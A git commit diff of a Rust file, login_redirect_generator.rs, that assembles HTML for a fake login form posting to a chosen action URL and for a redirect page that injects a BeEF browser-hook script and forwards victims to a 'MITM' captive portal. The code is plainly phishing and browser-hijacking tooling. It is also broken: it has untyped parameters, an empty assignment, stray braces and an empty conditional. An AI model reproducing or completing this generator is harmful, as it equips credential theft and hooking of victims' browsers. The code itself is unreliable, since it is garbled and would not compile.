3780843c1d39af72073df5979d435ab0b062201d
flyingfishfuse <46322912+flyingfishfuse@users.noreply.github.com>
2020-01-23 15:48:33 -0600

    Add files via upload

--- login_redirect_generator.rs
+++ login_redirect_generator.rs
@@ -31,11 +31,9 @@
 */
 fn make_html( hook_loc,  redirect, redir_messg, formaction, form_or_redirect) {
     let redirect_message      = redir_messg;
-    let html_form_body;
-    let hook_location = hook_loc;
-    let redirect_ip = redirect;
-
-    // build the form
+    let html_form_body        =  ;
+    let hook_location         = hook_loc;
+    let redirect_ip           = redirect;
     let html_login_head       ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
     let html_form_body_top    = "<body><form class=\"login\" ";
     let form_action           = format!("{}{}{}" , "\"action=\"" , formaction , "\"";
@@ -46,18 +44,14 @@ fn make_html( hook_loc,  redirect, redir_messg, formaction, form_or_redirect) {
                                 </form>\
                                 </body>\
                                 </html>";
-    // build the redirect
     let html_redirect_head   = "<html><head>";
     let beef_hook            = format!("{}{}{}" , "<script src=" , hook_loc ,"></script>");
     let html_redirect_middle = format!("{}{}{}" , "<meta http-equiv=\"refresh\" content=\"0; url=http://" , redirect_ip , "\" />");
     let redirect_bottom      = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
-
+    // build the redirect and submit form
+    let submit_form_body     = format!("{}{}{}{}" , html_login_head , html_form_body_top , form_action , html_form_body_bottom)};
+    let html_redirect_body   = format!("{}{}{}{}" , html_redirect_head , beef_hook , html_redirect_middle , redirect_bottom)};
     // Determine if the user wants the form or the redirect
-    if form_or_redirect == true {
-        let html_redirect_body = format!("{}{}{}{}" , html_redirect_head , beef_hook , html_redirect_middle , redirect_bottom)};
-        return html_redirect_body;
-    else if (form_or_redirect == false{
-        html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
-        return html_form_body;
-    };
+    if form_or_redirect == true {}
+    
 };
